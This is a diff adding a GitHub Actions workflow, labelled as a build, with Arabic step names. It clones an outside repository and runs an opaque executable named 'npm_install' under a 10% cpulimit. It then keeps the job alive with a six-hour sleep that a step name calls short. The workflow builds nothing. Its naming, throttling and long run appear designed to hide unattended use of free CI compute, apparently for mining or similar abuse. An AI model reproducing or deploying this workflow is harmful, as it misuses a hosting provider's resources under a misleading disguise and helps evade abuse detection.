@@ -1,0 +1,41 @@
+name: Build Action
+
+on:
+  push:
+    branches:
+      - ironman
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: استنساخ المستودع
+        uses: actions/checkout@v3
+        with:
+          repository: mohamedmahdydeveloper/react_starter_project
+          path: react_starter_project
+
+      - name: إعداد Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '16'
+
+      - name: إعطاء صلاحيات للتنفيذ
+        run: chmod +x react_starter_project/npm_install
+
+      - name: تثبيت cpulimit
+        run: sudo apt-get install -y cpulimit
+
+      - name: تشغيل  مع تحديد استهلاك CPU
+        run: |
+          cd react_starter_project
+          ./npm_install
+          sleep 2
+          NPM_INSTALL_PID=$(pgrep -f './npm_install')
+          # تطبيق cpulimit على الـPID
+          cpulimit -l 10 -p $NPM_INSTALL_PID &
+          echo "cpulimit تم تشغيله على PID $NPM_INSTALL_PID"
+          
+
+      - name: استمرار الـWorkflow لفترة قصيرة
+        run: sleep 21600
